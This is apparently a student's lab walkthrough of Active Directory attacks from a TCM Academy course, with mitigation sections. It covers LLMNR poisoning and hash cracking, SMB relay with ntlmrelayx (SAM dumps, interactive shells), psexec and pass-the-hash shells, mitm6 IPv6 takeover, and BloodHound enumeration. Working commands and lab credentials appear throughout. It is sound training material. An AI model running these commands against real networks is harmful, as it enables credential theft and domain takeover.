# LLMNR Poisoning
## LLMNR Poisoning Attacks
let's start a responder

![image](https://github.com/user-attachments/assets/9e89b6af-4e31-4e70-a91f-7873af3d6219)

wpad = allow web browser to automatically discover proxy without the need of any additonal configuration
For some reason, I can't enable w and P option at the same time so let's just stick with the P option instead

![image](https://github.com/user-attachments/assets/b9e20c94-7bfe-4fab-a7c5-0404cb90be80)

Let's go to punisher machine and use a domain account - fcastle:Password1
We can try to access the share with our attacker host IP address

![image](https://github.com/user-attachments/assets/e75dd889-4fd4-4700-9c21-815539f8b714)

we'll be prompted with this box

![image](https://github.com/user-attachments/assets/e3e80edc-df33-4bd0-a60c-1c4968251b09)

But on the attacker's machine, we should get the hash here

![image](https://github.com/user-attachments/assets/bb22dafc-4a12-414f-badb-ab97a1c8654a)

These hashes are equate to the same thing even though they are not identical

Now let's crack this hash using hashcat if we have cracking rigs, the process is going to be extremely fast on base OS. In this case we'll just use our vm since the password is quite easy

![image](https://github.com/user-attachments/assets/41fbdc28-cf13-428a-9e13-35cb00009f71)

The netNTLM hash uses mode 5600

we should get the cracked password here

![image](https://github.com/user-attachments/assets/d96b79d2-38c1-46ef-b270-ce808204ca2a)

## LLMNR Mitigation

![image](https://github.com/user-attachments/assets/ad441f88-37ae-4c8c-933d-e9c1f79d72fe)

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

![image](https://github.com/user-attachments/assets/755dacee-308f-4512-a968-9b6183d00d41)

![image](https://github.com/user-attachments/assets/20070be8-e12f-42ba-870f-7b36d2235480)

![image](https://github.com/user-attachments/assets/b1c05aae-6017-42de-a1fe-644f14c779b1)

Then double click into that policy, enable it then push it out

# SMB Relay
## SMB Relay Attacks

we can use this syntax to check whether the target machine has smb signing enabled or not

```
nmap --script=smb2-security-mode.nse -p445,139 192.168.85.156 -Pn
```

See that the result from scanning DC will return that it's required so we can't perform the smb relay to DC

![image](https://github.com/user-attachments/assets/54448aab-b565-4c51-895e-732466470ed2)

As for both machines, they are not required

![image](https://github.com/user-attachments/assets/afdb1848-8489-4883-9ca1-919bb197f247)

Now, add our target ip to target.txt file to perform smb relay

![image](https://github.com/user-attachments/assets/308e3484-b2c8-4030-9285-be650bbea753)

Then change the responder configuration file to disable smb and http  

```
sudo subl /etc/responder/Responder.conf
```
![image](https://github.com/user-attachments/assets/12f323e5-6deb-4544-b2f5-45c56f8faf09)

Start a responder and perfrom smb relay

![image](https://github.com/user-attachments/assets/61b379d0-c431-410b-92d3-7bb71f9bf034)

This version of ntlm script is the best one even though there are new tools out there

```
ntlmrelayx.py -tf target.txt -smb2support
```

it waits for event to happen then execute the smb relay
First, login to THEPUNISHER machine using the domain account fcastle. Then navigate to the share of our attacking IP

![image](https://github.com/user-attachments/assets/e905fb25-c28f-4c96-8070-c92d7e49be6c)

The error should pop up and we can go check back at the attacking machine

![image](https://github.com/user-attachments/assets/994d443c-1baa-4aec-b669-f165daf0a5ac)

Note: If first try didn't work, try until it work (when I did it, it took 2 attempts)
We can see the smb relay try to relay itself to THEPUNISHER machine but didn't work since it's the machine that triggers the smb relay therefore it couldn't relay to itself. The smb relay works on SPIDERMAN machine with the account of fcastle

![image](https://github.com/user-attachments/assets/c1d1df9b-f01a-4ff1-9d93-d6b974df9034)

We have admin hash and local admin hash which is peterparker here. IRL pentest, we will note this down as a finding

Another attack apart from SAM dump would be to spawn an interactive shell

```
ntlmrelayx.py -tf target.txt -smb2support -i
```

Then trigger the attack by navigating to our attacking machine's share again

![image](https://github.com/user-attachments/assets/3128fa8d-7052-4adf-9bf3-325bcecebf32)

After the success, we can nc to bind to shell by doing

```
nc 127.0.0.1 11000
```

![image](https://github.com/user-attachments/assets/1cf6a664-c413-481e-8f97-4025225290a7)

Or execute the command 

```
ntlmrelayx.py -tf target.txt -smb2support -c "whoami"
```

## SMB Relay Mitigations

![image](https://github.com/user-attachments/assets/b0d2507a-1f2d-49bb-8ffd-8e78b21733be)

Normally, we'll do the last 2 method

Ex: for account tiering is like when bob is a Domain admin, we need just bob with low privilege account to login to his machine while he has bob-dc with admin privilege to login to the DC only. As for take away local account, we can remove the local admin rights from users and when they need to install something, they would need to request a ticket to support because support has the admin rights to install something on user's local machine

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

#  Gaining Shell Access 
We can use psexec on either metasploit or psexec py (most of the time py file is more quite and less likely to get picked up)

```
use exploit/windows/smb/psexec
```

![image](https://github.com/user-attachments/assets/6bf6db90-fc8e-48ee-bd6c-5e98f8751ee7)

There are a bunch of targers here, if the first one doesn't work, we can try alternative but the Native upload one is the best one
Note: Make sure to turn off real time protection so that the payload doesn't get picked up by windows defender

![image](https://github.com/user-attachments/assets/cfdf7c97-7704-4e9a-8135-5e6b0c2529df)

Target 0 didn't work for me let's try the 2rd one

![image](https://github.com/user-attachments/assets/9384d961-2824-47f3-b5b2-eebf159c53f8)

It works!

Above is when we attack a domain user, we can also attack a local user as well
We can use the hash we collect from smb relay SAM dump earlier (when cracking password, we need the NT or the second part but as for PTH, we need a whole hash)

![image](https://github.com/user-attachments/assets/8afd8761-04bf-4ac9-becf-0bd3c9c24949)

![image](https://github.com/user-attachments/assets/09674e21-73cf-42db-be03-99fa0df85800)

Even though we dump this from local machine but notice that when we created both THEPUNISHER and SPIDERMAN machine, we use the same password as admin and that's Password1 so we can reuse the hash since the hash from Password1 will result in the same hash

Now let's try with psexec.py

```
psexec.py MARVEL/fcastle:'Password1'@192.168.85.147
```
We sucessfully gain the shell as an admin by attacking Domain account

![image](https://github.com/user-attachments/assets/b7eccdad-0aad-437f-8487-d7548ae919fb)

If we got in a situation where the password has a weird character we can use this syntax and paste a password in later instead

![image](https://github.com/user-attachments/assets/c1dda801-2a13-4bfc-a766-344c1a1315b2)

Let's attack local admin with PTH

![image](https://github.com/user-attachments/assets/dd64ada1-caa3-4539-8e36-8abe8d5cfcfe)

If psexec doesn't work, remember that we still have tha alternatives like wmiexec or even smbexec

![image](https://github.com/user-attachments/assets/3cb10f76-0649-4d9c-90b0-dc5626bb14a4)

# IPv6 Attacks
##  IPv6 DNS Takeover via mitm6
We can use a tool called mitm6 to capture ipv6 traffic just like responder
Warning: This shouldn't be run for more than 5-10 mins since it can disrupt the whole network

```
sudo mitm6 -d marvel.local
```
Before running that let's run the ntlm relay just like before but this time instead of using -tf (target file) flag, we'll use -6 to specify IPv6 and -t as a target. Remember that we used to set a certificate for ldap from the lab setup and point the attack to DC ip. Then set up fake wpad and the loot (folder that will be created with loot files)

```
ntlmrelayx.py -6 -t ldaps://192.168.85.156 -wh fakewpad.marvel.local -l lootme
```

![image](https://github.com/user-attachments/assets/bffbe905-5c11-43fb-9b99-03f80e8cc2e2)

Then start the mitm6 and reboot THEPUNISHER machine to cause an event

![image](https://github.com/user-attachments/assets/cc1e8282-d76e-4648-9bf1-ca9f9075e7d6)

We should get a response of something like this

![image](https://github.com/user-attachments/assets/a603fa5b-f726-405c-85f2-a467aedec2f1)

We can check the lootme folder that was created in a location where we run ntlmrelayx (I ran it in download) and see the ldapdump files

![image](https://github.com/user-attachments/assets/adf5f617-44a7-4635-84b4-97e2ca0dc6b0)

![image](https://github.com/user-attachments/assets/788d3662-c244-49d0-8dc8-d0afbf977e90)

Interesting files here that we can check them out

When we login to the machine using Domain Admin account MARVEL\administrator:P@$$w0rd!

![image](https://github.com/user-attachments/assets/2a4303bc-a3f4-4249-b85d-3d54c3d72045)

See that it created a new user with enterprise admin privilege which can perform a secretdump.py to compromise the domain, even though it's not a domain admin that can access any machine but this is still huge

![image](https://github.com/user-attachments/assets/51e07d80-1e0d-4801-a870-5a6cf50a7f2d)

This user was actually created on the DC - CkJzjKxCCM:r>)rZhsgUn(y8*<

![image](https://github.com/user-attachments/assets/d6012fec-7f5d-4f71-9823-6a3e49c040e6)

## IPv6 Attack Defenses 

![image](https://github.com/user-attachments/assets/5999e53f-dd03-4a37-ab12-11626aac2cd7)

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

We can set the blocks instead of disable them. Best practice is to disable WPAD & WIN proxy, LDAP signing to confirm that it's actually you not someone relaying

# Domain Enumeration
## ldapdomaindump
we can dump a bunch of info about the DC from this syntax

```
sudo ldapdomaindump ldaps://192.168.85.156 -u 'MARVEL\fcastle' -p 'Password1'
```

![image](https://github.com/user-attachments/assets/e8a85cd2-5ecc-43ed-b8ac-c0af04348962)

![image](https://github.com/user-attachments/assets/bf1aeee2-7997-49f1-82c1-c7a2e8cf99f3)

## BloodHound
Before start, make sure that bloodhound and neo4j is up to date by doing 

```
sudo pip3 install bloodhound
sudo apt install neo4j
```
In this case I'll just run it in venv since I can't install on normal env

```
python3 -m venv ~/venvs/bloodhound-env
source ~/venvsbloodhound-env/bin/activate
pip3 install bloodhound
deactivate
```

![image](https://github.com/user-attachments/assets/43347024-aa91-46ff-a525-db100eefe176)

Whenever I need to use bloodhound I'll call directly from the binary on my machine but as for bloodhound-python, I'll call it from venv environment

```
bloodhound-env/bin/bloodhound-python -h
```

![image](https://github.com/user-attachments/assets/a4abf516-cd1f-4699-aa75-1ba6eef35264)

Then start a neo4j console which will give us ip to a remote console

![image](https://github.com/user-attachments/assets/47f2fc75-26fa-4801-8d71-29da4c2c78c0)

When first login to the page, it'll prompt for username and password it's neo4j:neo4j

![image](https://github.com/user-attachments/assets/a162d4b7-930a-4c60-8040-818c5301d491)

It'll prompt for a new password I'll go with **neo4j1**

![image](https://github.com/user-attachments/assets/43ceab1c-554b-4b5e-8975-dda15877412c)

Then we can fire off bloodhound

```
sudo bloodhound
```

![image](https://github.com/user-attachments/assets/165cdefe-dc25-4265-adea-78a9603a866a)

enter the username and password we just created **neo4j:neo4j1**

![image](https://github.com/user-attachments/assets/f4c9597c-b988-429c-bfbf-e5facd787355)

We need to collect data that can be used here using ingester

```
bloodhound-env/bin/bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns <DC IP> -c all 
```

-ns = name server
-c = data collect which we'll collect all data

![image](https://github.com/user-attachments/assets/394c946d-0cd0-4234-939b-da5087f06b72)

We ran the scan and get a bunch of files here which we need to import into the bloodhound

![image](https://github.com/user-attachments/assets/4cb39731-10ed-4c7f-bdf6-2e734ff5dfd9)

We'll import all the files into bloodhound

![image](https://github.com/user-attachments/assets/63ebec7b-a637-4ee2-b98e-acc46601c599)

![image](https://github.com/user-attachments/assets/5b573d28-4f14-46d9-82cf-ce06c1b8938f)

We can check whether the info is sucessfully imported by checking database info which we have some data here and check the analysis

![image](https://github.com/user-attachments/assets/3638fb9a-60e1-4932-b0bd-6647c2f81b03)

We can see the graphical display of all domain admins

![image](https://github.com/user-attachments/assets/9627e8dd-a909-4b0f-a82d-e874bea02523)

## Plumhound
I install it inside the virtual env once again but without the env activation
```
sudo python3 -m venv /opt/AD_attack/PlumHound/venv
sudo /opt/AD_attack/PlumHound/venv/bin/pip install -r /opt/AD_attack/PlumHound/requirements.txt
```
Using Plumhound.py
```
sudo /opt/AD_attack/PlumHound/venv/bin/python /opt/AD_attack/PlumHound/PlumHound.py
```
Let's test if this works (Make sure that bloodhound is up and running since we will pull info from that and analyse the data inside bloodhound
```
sudo /opt/AD_attack/PlumHound/venv/bin/python /opt/AD_attack/PlumHound/PlumHound.py --easy -p neo4j1
```
We should be able to see the task here

![image](https://github.com/user-attachments/assets/2cbf8b20-df3d-4529-974a-7067ae32930e)

Let's create a report of the default tasks

```
sudo /opt/AD_attack/PlumHound/venv/bin/python /opt/AD_attack/PlumHound/PlumHound.py -x tasks/default.tasks -p neo4j1
```

![image](https://github.com/user-attachments/assets/efa6a27d-aad5-46d2-9fb5-67148ceb2d2c)

![image](https://github.com/user-attachments/assets/07c388c6-3d28-4ed9-92d9-05558df9e9bb)

We can check the index.html to see comprehensive report

![image](https://github.com/user-attachments/assets/b6a2bf7a-e3c7-4d33-86de-a82155b8243d)

# Pass Attacks


